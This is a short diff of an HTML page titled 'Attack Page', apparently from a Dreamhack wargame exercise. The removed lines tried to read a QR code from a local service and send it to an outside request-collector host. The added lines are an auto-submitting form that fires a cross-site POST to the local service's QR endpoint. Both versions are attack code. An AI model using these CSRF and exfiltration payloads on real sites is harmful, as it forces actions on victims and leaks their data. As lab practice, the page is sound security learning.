@@ -6,17 +6,11 @@
     <title>Attack Page</title>
 </head>
 <body>    
+    <form id="qrForm" method="POST" action="http://host.docker.internal:10023/generate_qr_code">
+        <input type="submit" value="QR 코드 생성">
+    </form>
     <script>
-        var qr_page;
-        var qr_code;
-        const server = "https://sjichvc.request.dreamhack.games";
-        function get_qr(){
-            
-            qr_page = window.open('http://host.docker.internal:10023/generate_qr_code');
-            qr_code = qr_page.document.getElementById("QR")
-            window.open(`${server}?qr_code=${qr_code}`);
-        }
-        
+        document.getElementById('qrForm').submit();
     </script>
 </body>
 </html>
